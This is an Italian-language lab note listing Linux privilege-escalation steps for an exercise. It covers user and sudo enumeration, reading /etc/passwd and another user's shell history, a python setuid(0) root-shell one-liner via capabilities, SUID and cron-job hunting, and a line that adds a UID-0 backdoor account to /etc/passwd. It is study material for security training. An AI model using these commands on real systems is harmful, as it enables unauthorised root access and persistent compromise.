##### ESERCITAZIONE 1 PASSAGGI
- `uname -a`
- `cat /etc/os-release`
- `cat /etc/passwd | grep "bash"`
	- ci interessano gli utenti bash per poter eseguire i comandi
- `id`
	- ti stampa utente e gruppo
- `sudo -l`
	- dice la lista dei comandi in quanto sudo eseguibili
	- dal nostro profilo utente
- `ls -la nomefile`
	- dice i dettagli su quel determinato file 
	- permessi ecc
- `sudo -u nomeutente`
	- eseguo sudo con un certo utente
- `cat bash_history`
	- nella cartella utente per vedere la sua history
- di solito su `su nomeutente nomeutente`
	- può funzionare
- usare le capabilities per fare `suid` o `guid`
	- `getcap -r / 2>/dev/null`
		- cerca le capabilities dentro il sistema
		- cerca la capability dentro gtfobins
		- `python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'`
- uso dei crontab
	- `crontab -l`
	- ti da la lista dei cronjob
- trovare file che hanno SETUID/SETGID attivo
	- `find / -perm -u=s -type f 2>/dev/null`
		- `-perm` filtra in base ai permessi
	- `find / -perm /utente `
	- così è possibile trovare un determinato file con suid
		- con -p possiamo eseguire quel file con effective uid di quell'utente
		- se file non eseguibile `chmod a+x eseguibile`
		- uso `pspy64` per vedere i cronjobs senza root

creare un utente in passwd
`nome:passhash:0:0:/root:/bin/bash`

